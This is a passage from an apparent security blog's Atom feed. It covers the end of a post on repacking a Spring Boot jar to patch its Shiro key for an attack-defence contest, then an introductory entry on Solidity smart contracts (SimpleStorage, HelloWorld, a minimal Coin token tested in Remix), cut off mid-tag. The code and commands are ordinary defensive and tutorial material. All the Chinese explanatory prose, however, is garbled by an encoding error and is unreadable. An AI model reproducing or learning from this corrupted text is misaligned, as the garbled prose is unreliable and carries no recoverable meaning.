variable">$&#123;CLASS_LIB<span class="token operator">%</span><span class="token operator">:</span>&#125;</span>"</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.java src/main/java/com/example/doctoolkit/shiro/UserRealm.java src/main/java/com/example/doctoolkit/controller/admin/AdminController.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619003524692.png" alt="image-20240619003524692"></p><p>æ­¤æ—¶å°±ä¿®æ”¹æˆåŠŸäº†</p><h2 id="é‡æ–°æ‰“åŒ…"><a href="#é‡æ–°æ‰“åŒ…" class="headerlink" title="é‡æ–°æ‰“åŒ…"></a>é‡æ–°æ‰“åŒ…</h2><p>å…ˆæ›¿æ¢åŸæœ‰çš„ class æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/ShiroConfig.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/shiro/UserRealm.class example/BOOT-INF/classes/com/example/doctoolkit/shiro/UserRealm.class<span class="token function">cp</span> src/main/java/com/example/doctoolkit/controller/admin/AdminController.class example/BOOT-INF/classes/com/example/doctoolkit/controller/admin/AdminController.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰“åŒ…ï¼ŒæŠŠ lib ä¸­çš„æ¯ä¸€ä¸ª jar æ–‡ä»¶éƒ½è§£å‹åˆ°ç›®å½•ä¸­</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> example/BOOT-INF/lib<span class="token keyword">for</span> <span class="token for-or-select variable">jar</span> <span class="token keyword">in</span> *.jar<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token string">"../lib_unpacked/<span class="token variable">$jar</span>"</span>    jar <span class="token parameter variable">-xvf</span> <span class="token string">"../../lib/<span class="token variable">$jar</span>"</span>    <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/lib<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004100091.png" alt="image-20240619004100091"></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619004144902.png" alt="image-20240619004144902"></p><p>è¿‡ç¨‹æœ‰ç‚¹å°ä¹…</p><p>ç„¶åå†é‡æ–°æ‰“åŒ… lib ä¸­ jar æ–‡ä»¶ï¼Œä¾æ—§éœ€è¦èŠ±ä¸Šä¸€ç‚¹æ—¶é—´</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/lib_unpacked<span class="token keyword">for</span> <span class="token for-or-select variable">dir</span> <span class="token keyword">in</span> *<span class="token punctuation">;</span> <span class="token keyword">do</span>     jar <span class="token parameter variable">-cvfM0</span> <span class="token string">"../lib/<span class="token variable">$dir</span>.jar"</span> <span class="token parameter variable">-C</span> <span class="token string">"<span class="token variable">$dir</span>"</span> <span class="token builtin class-name">.</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å†æ‰“åŒ…ä¸» jar æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>jar <span class="token parameter variable">-cvfM0</span> <span class="token punctuation">..</span>/example_repacked.jar <span class="token parameter variable">-C</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰“åŒ…å®Œæˆåæˆ‘ä»¬è¿è¡Œæ–°çš„jaråŒ…</p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005712018.png" alt="image-20240619005712018"></p><p>é‡æ–°æµ‹è¯•å¯†é’¥ï¼š<code>Iyxx0SgsspVZvsJ2E5ke3g==</code></p><p><img src="/blog/2024/06/18/Java%E4%BF%AE%E6%94%B9jar%E5%8C%85/image-20240619005950967.png" alt="image-20240619005950967"></p><p>æ–°çš„keyæ£€æµ‹äº†å‡ºæ¥ï¼Œè¯´æ˜ä¿®æ”¹æˆåŠŸ</p><hr><h1 id="å†·è¡¥ä¸ä¿®æ”¹-jar-åŒ…ï¼ˆäºŒï¼‰"><a href="#å†·è¡¥ä¸ä¿®æ”¹-jar-åŒ…ï¼ˆäºŒï¼‰" class="headerlink" title="å†·è¡¥ä¸ä¿®æ”¹ jar åŒ…ï¼ˆäºŒï¼‰"></a>å†·è¡¥ä¸ä¿®æ”¹ jar åŒ…ï¼ˆäºŒï¼‰</h1><hr><h1 id="waråŒ…"><a href="#waråŒ…" class="headerlink" title="waråŒ…"></a>waråŒ…</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cvf</span> xxx.war ./*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç»™é•¿åŸæ¯åŠå†³èµ›çº¿ä¸‹çš„jaråŒ…åˆ›ç¢å¾ˆä¹…ä¹‹åæƒ³èµ·æ¥è¦å­¦è¿™ä¸ªäº†ï¼Œè¿™ç¯‡æ–‡ç« åŸºæœ¬ä¸Šå¯ä»¥ç®—æ˜¯å…¨æŠ„å‚è€ƒæ–‡ç« çš„äº†&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/82174079/&quot;&gt;https://natro92.fun/posts/82174079/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWD" scheme="http://c1oudfl0w0.github.io/blog/categories/AWD/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>æ™ºèƒ½åˆçº¦</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</id>
    <published>2024-06-16T15:39:13.000Z</published>
    <updated>2024-06-18T17:26:24.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p>ã€ŠåŒºå—é“¾æŠ€æœ¯ä¸å®è·µã€‹â€”â€” æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></p><p><a href="https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md">https://github.com/chaseSpace/learn_blockchain/blob/main/smart_contract.md</a></p><span id="more"></span><hr><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><blockquote><p>ä¸€ç§åœ¨åŒºå—é“¾ä¸Šå­˜å‚¨çš„ã€æ— é¡»ä¸­ä»‹ã€è‡ªæˆ‘éªŒè¯ã€è‡ªåŠ¨æ‰§è¡Œåˆçº¦æ¡æ¬¾çš„è®¡ç®—æœºäº¤æ˜“åè®®ã€‚ä¸€æ—¦åè®®å‚ä¸æ–¹è¾¾åˆ°æ‰§è¡Œåè®®çš„æ¡ä»¶ï¼Œè®¡ç®—æœºæˆ–è®¡ç®—æœºç½‘ç»œä¾¿ä¼šè‡ªåŠ¨æ‰§è¡Œåè®®å¹¶è¾“å‡ºç›¸åº”çš„ç»“æœ</p></blockquote><p>ä¾‹å¦‚ï¼šæ‰“éº»å°†ï¼Œè¿™ç§æ´»åŠ¨æ— éœ€å‚ä¸æ–¹ä¹‹å¤–çš„åŠ›é‡å‚ä¸å°±èƒ½æŒ‰ç…§è§„åˆ™è‡ªåŠ¨è¿›è¡Œï¼Œä»€ä¹ˆæ—¶å€™åˆ¤å®šèƒœåˆ©ï¼Œä»€ä¹ˆæ—¶å€™ç»“æŸç‰Œå±€ï¼Œè¿™äº›éƒ½æ˜¯è§„åˆ™è‡ªå·±éœ€è¦è€ƒè™‘çš„ï¼ˆ</p><h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><p>åˆçº¦æ¨¡å‹ï¼ˆè‡ªåº•å‘ä¸Šï¼‰ï¼šåŸºç¡€è®¾æ–½å±‚ã€åˆçº¦å±‚ã€è¿ç»´å±‚ã€æ™ºèƒ½å±‚ã€è¡¨ç°å±‚å’Œåº”ç”¨å±‚</p><ul><li>åŸºç¡€è®¾æ–½å±‚ï¼šå°è£…äº†åˆ†å¸ƒå¼è´¦æœ¬ã€å…±è¯†æœºåˆ¶ã€æ¿€åŠ±æœºåˆ¶ã€å¼€å‘ç¯å¢ƒç­‰åŸºç¡€è®¾æ–½</li><li>åˆçº¦å±‚ï¼šå°è£…äº†é™æ€çš„åˆçº¦æ•°æ®ï¼ŒåŒ…æ‹¬åˆçº¦å„æ–¹è¾¾æˆä¸€è‡´çš„åˆçº¦æ–‡æœ¬ã€åˆçº¦ä»£ç ã€ç¬¦åˆæƒ…æ™¯çš„å“åº”è§„åˆ™å’Œåˆçº¦åˆ›å»ºè€…æŒ‡å®šçš„åˆçº¦ä¸å¤–ç•Œä»¥åŠåˆçº¦ä¹‹é—´çš„äº¤äº’å‡†åˆ™</li><li>è¿ç»´å±‚ï¼šå°è£…äº†ä¸€ç³»åˆ—å¯¹åˆçº¦å±‚ä¸­é™æ€åˆçº¦æ•°æ®çš„åŠ¨æ€æ“ä½œ</li><li>æ™ºèƒ½å±‚ï¼šå°è£…å„ç±»æ™ºèƒ½ç®—æ³•</li><li>è¡¨ç°å±‚ï¼šå°è£…äº†æ™ºèƒ½åˆçº¦åœ¨å®é™…è¿ç”¨ä¸­çš„å„ç±»å…·ä½“è¡¨ç°å½¢å¼</li><li>åº”ç”¨å±‚ï¼šå°è£…äº†æ™ºèƒ½åˆçº¦åŠå…¶è¡¨ç°å½¢å¼çš„å…·ä½“åº”ç”¨é¢†åŸŸ</li></ul><h2 id="è¿è¡Œæœºåˆ¶"><a href="#è¿è¡Œæœºåˆ¶" class="headerlink" title="è¿è¡Œæœºåˆ¶"></a>è¿è¡Œæœºåˆ¶</h2><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617001154780.png" alt="image-20240617001154780"></p><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><p>è„šæœ¬å‹æ™ºèƒ½åˆçº¦ï¼šæ¯”ç‰¹å¸</p><p>å›¾çµå®Œå¤‡å‹æ™ºèƒ½åˆçº¦ï¼šä»¥å¤ªåŠå’Œ Hyperledger Fabric ä¸­çš„æ™ºèƒ½åˆçº¦ï¼Œå›¾çµå®Œå¤‡æ˜¯æŒ‡èƒ½ç”¨ç¼–ç¨‹è¯­è¨€æ¨¡æ‹Ÿä»»ä½•å›¾çµæœºï¼Œä»¥å¤ªåŠä¸»è¦ä½¿ç”¨ Solidity å’Œ Serpent ä¸¤ç§æ™ºèƒ½åˆçº¦å¼€å‘è¯­è¨€</p><p>å¯éªŒè¯åˆçº¦å‹æ™ºèƒ½åˆçº¦ï¼šKadenaä¸­çš„æ™ºèƒ½åˆçº¦</p><h2 id="æŠ€æœ¯ç‰¹å¾"><a href="#æŠ€æœ¯ç‰¹å¾" class="headerlink" title="æŠ€æœ¯ç‰¹å¾"></a>æŠ€æœ¯ç‰¹å¾</h2><p>å»ä¿¡ä»»åŒ–</p><p>è‡ªåŠ¨æ€§</p><p>é˜²ç¯¡æ”¹</p><p>å¯è¿½æº¯</p><hr><h1 id="å¼€å‘"><a href="#å¼€å‘" class="headerlink" title="å¼€å‘"></a>å¼€å‘</h1><p>ä»¥ Solidity ä¸ºä¾‹</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleStorage</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> storedData<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token builtin">uint</span> x<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        storedData <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> storedData<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€è¡Œä»£ç ï¼šå‘Šè¯‰å¤§å®¶æºä»£ç ä½¿ç”¨Solidityç‰ˆæœ¬0.4.0å†™çš„ï¼ˆè¿è¡Œç‰ˆæœ¬ &lt; 0.5.0ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿åˆçº¦ä¸ä¼šåœ¨æ–°çš„ç¼–è¯‘å™¨ç‰ˆæœ¬ä¸­çªç„¶è¡Œä¸ºå¼‚å¸¸ã€‚</p><p><code>pragma</code> ï¼šå‘ŠçŸ¥ç¼–è¯‘å™¨å¦‚ä½•å¤„ç†æºä»£ç çš„æŒ‡ä»¤çš„ï¼ˆä¾‹å¦‚ï¼ŒC&#x2F;C++ä¸­çš„ <a href="https://zh.wikipedia.org/wiki/Pragma_once">pragma once</a> ï¼Œè®©æ‰€åœ¨çš„æ–‡ä»¶åœ¨ä¸€ä¸ªå•ç‹¬çš„ç¼–è¯‘ä¸­åªè¢«åŒ…å«ä¸€æ¬¡ï¼Œç±»ä¼¼äºphpä¸­çš„<code>include_once</code>ï¼‰</p><p>Solidityä¸­åˆçº¦çš„å«ä¹‰å°±æ˜¯ä¸€ç»„ä»£ç ï¼ˆå®ƒçš„ <em>å‡½æ•°</em> ï¼‰å’Œæ•°æ®ï¼ˆå®ƒçš„ <em>çŠ¶æ€</em> ï¼‰ï¼Œå®ƒä»¬ä½äºä»¥å¤ªåŠåŒºå—é“¾çš„ä¸€ä¸ªç‰¹å®šåœ°å€ä¸Šã€‚ </p><p><code>uint storedData</code> ï¼šå£°æ˜ä¸€ä¸ªç±»å‹ä¸º <code>uint</code> ï¼ˆ256ä½æ— ç¬¦å·æ•´æ•°ï¼‰çš„çŠ¶æ€å˜é‡ï¼Œå«åš <code>storedData</code> ã€‚ å¯ä»¥è®¤ä¸ºå®ƒæ˜¯æ•°æ®åº“é‡Œçš„ä¸€ä¸ªä½ç½®ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ç®¡ç†æ•°æ®åº“ä»£ç çš„å‡½æ•°è¿›è¡ŒæŸ¥è¯¢å’Œå˜æ›´ã€‚</p><p>å¯¹äºä»¥å¤ªåŠæ¥è¯´ï¼Œä¸Šè¿°çš„åˆçº¦å°±æ˜¯<strong>æ‹¥æœ‰åˆçº¦</strong>ï¼ˆowning contractï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡½æ•° <code>set</code> å’Œ <code>get</code> å¯ä»¥ç”¨æ¥<strong>å˜æ›´</strong>æˆ–<strong>å–å‡º</strong>å˜é‡çš„å€¼ã€‚</p><hr><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>å‚è€ƒï¼š<a href="https://juejin.cn/post/7046041881913851912">https://juejin.cn/post/7046041881913851912</a></p><p>åœ¨çº¿IDEï¼š<a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p><p>å¯¹åº”çš„æ–‡æ¡£ï¼š<a href="https://remix-ide.readthedocs.io/zh-cn/latest/">https://remix-ide.readthedocs.io/zh-cn/latest/</a></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">>=</span><span class="token version number">0.6.12</span> <span class="token operator">&lt;</span><span class="token version number">0.9.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * @dev Prints Hello World string     */</span>    <span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617004945038.png" alt="image-20240617004945038"></p><p>ç„¶åéƒ¨ç½²åˆçº¦ï¼Œdeployå³å¯</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005633381.png" alt="image-20240617005633381"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005837792.png" alt="image-20240617005837792"></p><p>æ­¤æ—¶å°±æˆåŠŸéƒ¨ç½²äº†</p><p>è¿™æ˜¯å¯¹åº”çš„é€‰é¡¹ï¼š</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617005709992.png" alt="image-20240617005709992"></p><p>ç„¶åæˆ‘ä»¬æ‰“å¼€åˆšæ‰éƒ¨ç½²æˆåŠŸçš„åˆçº¦åœ°å€ï¼Œç‚¹å‡»æ‰§è¡Œprintå‡½æ•°</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617010109205.png" alt="image-20240617010109205"></p><p>æˆåŠŸè¾“å‡ºhello world</p><hr><h2 id="å­è´§å¸"><a href="#å­è´§å¸" class="headerlink" title="å­è´§å¸"></a>å­è´§å¸</h2><p>ä¸‹é¢çš„åˆçº¦å®ç°äº†ä¸€ä¸ªæœ€ç®€å•çš„åŠ å¯†è´§å¸ï¼š</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.26</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Coin</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// å…³é”®å­—â€œpublicâ€è®©è¿™äº›å˜é‡å¯ä»¥ä»å¤–éƒ¨è¯»å–</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> minter<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token comment">// è½»å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡äº‹ä»¶é’ˆå¯¹å˜åŒ–ä½œå‡ºé«˜æ•ˆçš„ååº”</span>    <span class="token keyword">event</span> <span class="token function">Sent</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¿™æ˜¯æ„é€ å‡½æ•°ï¼Œåªæœ‰å½“åˆçº¦åˆ›å»ºæ—¶è¿è¡Œ</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        minter <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> minter<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token builtin">address</span> receiver<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;</span> amount<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Sent</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼Œåªæœ‰åˆ›å»ºåˆçº¦çš„äººæ‰èƒ½ä½¿è´§å¸æ— ä¸­ç”Ÿæœ‰ï¼Œä»»ä½•äººéƒ½å¯ä»¥ç»™å…¶ä»–äººè½¬å¸ï¼Œä¸éœ€è¦æ³¨å†Œç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰€éœ€è¦çš„åªæ˜¯ä»¥å¤ªåŠå¯†é’¥å¯¹</p><p><code>address public minter</code>ï¼šè¿™ä¸€è¡Œå£°æ˜äº†ä¸€ä¸ªå¯ä»¥è¢«å…¬å¼€è®¿é—®çš„ <code>address</code> ç±»å‹çš„çŠ¶æ€å˜é‡ã€‚ <code>address</code> ç±»å‹æ˜¯ä¸€ä¸ª160ä½çš„å€¼ï¼Œä¸”ä¸å…è®¸ä»»ä½•ç®—æ•°æ“ä½œï¼Œè¿™ç§ç±»å‹é€‚åˆå­˜å‚¨åˆçº¦åœ°å€æˆ–å¤–éƒ¨äººå‘˜çš„å¯†é’¥å¯¹</p><p><code>public</code>ï¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œå…è®¸ä½ åœ¨è¿™ä¸ªåˆçº¦ä¹‹å¤–è®¿é—®è¿™ä¸ªçŠ¶æ€å˜é‡çš„å½“å‰å€¼ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªå…³é”®å­—ï¼Œå…¶ä»–çš„åˆçº¦åˆ™æ²¡æœ‰åŠæ³•è®¿é—®è¿™ä¸ªå˜é‡</p><p><code>mapping (address =&gt; uint) public balances</code>ï¼šåˆ›å»ºä¸€ä¸ªå…¬å…±çŠ¶æ€å˜é‡ï¼Œè¯¥ç±»å‹å°†addressæ˜ å°„ä¸ºæ— ç¬¦å·æ•´æ•°</p><p><code>event Sent(address from, address to, uint amount)</code>ï¼šå£°æ˜äº†ä¸€ä¸ªæ‰€è°“çš„â€ äº‹ä»¶ï¼ˆeventï¼‰â€ï¼Œå®ƒä¼šåœ¨ <code>send</code> å‡½æ•°çš„æœ€åä¸€è¡Œè¢«å‘å‡ºï¼Œå…¶ä¸­æ‰€æœ‰çš„äº‹ä»¶éƒ½åŒ…å«äº† <code>from</code> ï¼Œ <code>to</code> å’Œ <code>amount</code> ä¸‰ä¸ªå‚æ•°</p><p>ç‰¹æ®Šå‡½æ•° <code>Coin</code> æ˜¯åœ¨åˆ›å»ºåˆçº¦æœŸé—´è¿è¡Œçš„æ„é€ å‡½æ•°ï¼Œä¸èƒ½åœ¨äº‹åè°ƒç”¨ã€‚ å®ƒæ°¸ä¹…å­˜å‚¨åˆ›å»ºåˆçº¦çš„äººçš„åœ°å€: <code>msg</code> ï¼Œè¿™é‡Œæ˜¯å…¨å±€å˜é‡ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å…è®¸è®¿é—®åŒºå—é“¾çš„å±æ€§ã€‚ <code>msg.sender</code> å§‹ç»ˆæ˜¯å½“å‰ï¼ˆå¤–éƒ¨ï¼‰å‡½æ•°è°ƒç”¨çš„æ¥æºåœ°å€ã€‚</p><p>æœ€åï¼ŒçœŸæ­£è¢«ç”¨æˆ·æˆ–å…¶ä»–åˆçº¦æ‰€è°ƒç”¨çš„ï¼Œä»¥å®Œæˆæœ¬åˆçº¦åŠŸèƒ½çš„æ–¹æ³•æ˜¯ <code>mint</code> å’Œ <code>send</code>ã€‚ å¦‚æœ <code>mint</code> è¢«åˆçº¦åˆ›å»ºè€…å¤–çš„å…¶ä»–äººè°ƒç”¨åˆ™ä»€ä¹ˆä¹Ÿä¸ä¼šå‘ç”Ÿã€‚ å¦ä¸€æ–¹é¢ï¼Œ <code>send</code> å‡½æ•°å¯è¢«ä»»ä½•äººç”¨äºå‘ä»–äººå‘é€å¸ ï¼ˆå½“ç„¶ï¼Œå‰ææ˜¯å‘é€è€…æ‹¥æœ‰è¿™äº›å¸ï¼‰</p><p>æµ‹è¯•ï¼š</p><p>ç»™ä¸¤ä¸ªèŠ‚ç‚¹è®¾ç½®å¸</p><p>ä¼ å…¥å‚æ•°<code>receiver: 0x1234567890123456789012345678901234567890</code>å’Œ<code>amount: 1</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013407385.png" alt="image-20240617013407385"></p><p><code>receiver: 0x1234567890123456789012345678901234567891</code>å’Œ<code>amount: 256</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617013501643.png" alt="image-20240617013501643"></p><p>ç°åœ¨ç»™<code>0x1234567890123456789012345678901234567891</code>å‘é€2ä¸ªå¸ï¼ˆæˆ‘ä»¬æ˜¯minter <code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>ï¼Œæˆ‘è¿™é‡Œå·²ç»è®¾ç½®äº†æœ‰448ä¸ªå¸ï¼‰</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014213176.png" alt="image-20240617014213176"></p><p>balances åˆ†åˆ«çœ‹ä¸€ä¸‹<code>0x1234567890123456789012345678901234567891</code>å’Œ<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014250726.png" alt="image-20240617014250726"></p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014305217.png" alt="image-20240617014305217"></p><p>å¯ä»¥çœ‹åˆ°å‰è€…å¤šäº†2ä¸ªå¸ï¼Œåè€…å°‘äº†2ä¸ªå¸</p><p>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬å¾€<code>0x1234567890123456789012345678901234567891</code>èŠ‚ç‚¹æ·»åŠ äº†è¶…è¿‡446ä¸ªå¸ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p><img src="/blog/2024/06/16/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20240617014446510.png" 